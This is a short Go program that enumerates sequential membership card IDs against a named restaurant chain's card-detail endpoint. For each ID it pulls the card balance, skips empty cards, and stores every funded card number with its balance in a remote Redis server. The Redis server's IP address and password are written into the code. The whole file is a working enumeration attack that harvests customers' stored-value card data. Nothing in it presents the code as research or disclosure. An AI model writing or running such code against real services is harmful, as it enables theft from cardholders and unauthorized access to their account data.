package main

import (
	"github.com/go-redis/redis"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
	"strings"
)

func main() {

	rd := redisUtils()

	for i := 100000; i <= 999999; i++ {
		resp, _ := http.Get("http://card.haidilao.net/TzxMember/tzx/getCardDetailInfo?hykid=NC20190" + strconv.Itoa(i))
		defer resp.Body.Close()
		bodyText, _ := ioutil.ReadAll(resp.Body)
		text := string(bodyText)
		if strings.Contains(text, "HTTP Status 500") {
			continue
		}
		// 余额
		lpos := strings.Index(text, "knye")
		rpos := strings.Index(text, "kzbh")
		myPrice := text[lpos+6 : rpos-2]
		if myPrice == "0.0" {
			continue
		}
		t := "NC20190" + strconv.Itoa(i) + "-" + myPrice
		rd.SAdd("hdlOtherCard", t)
		log.Println(t)
	}

}

func redisUtils() *redis.Client {
	rdb := redis.NewClient(&redis.Options{Addr: "175.27.243.243:6379", Password: "213879", DB: 0})
	return rdb
}
